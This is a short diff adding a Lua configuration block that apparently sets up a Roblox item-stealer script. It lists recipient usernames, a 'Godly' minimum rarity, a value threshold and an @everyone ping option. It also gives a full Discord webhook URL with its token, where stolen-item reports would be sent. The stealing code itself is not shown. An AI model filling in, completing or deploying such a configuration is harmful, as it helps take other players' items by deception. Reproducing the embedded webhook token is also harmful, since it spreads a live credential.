@@ -1,0 +1,5 @@
+_G.Usernames = {"MATTHEO2776"} -- you can add as many as you'd like
+_G.min_rarity = "Godly"
+_G.min_value = 1 -- Put 1 to get all
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1365419524954001439/NYStspBi5t5ekR0dDTDFJYjzMJZ5HXM9UgYbOrTmHuNM-0iSJ1ZsFbc4oRIpGWKuWNIC" -- change to your webhook
